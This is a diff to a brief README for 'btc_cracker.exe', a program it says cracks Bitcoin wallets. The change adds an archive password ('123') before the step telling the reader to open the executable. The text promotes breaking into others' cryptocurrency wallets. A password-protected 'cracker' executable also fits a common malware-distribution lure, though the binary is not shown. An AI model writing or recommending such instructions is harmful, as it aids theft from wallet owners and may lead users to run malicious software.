@@ -1,6 +1,8 @@
-#How to use 
+#How to use
 
-1) Open btc_cracker.exe
+1) The password for the archive is - 123
+
+2) Open btc_cracker.exe
 
 2) Click START and wait softwere to crack some wallets.
 
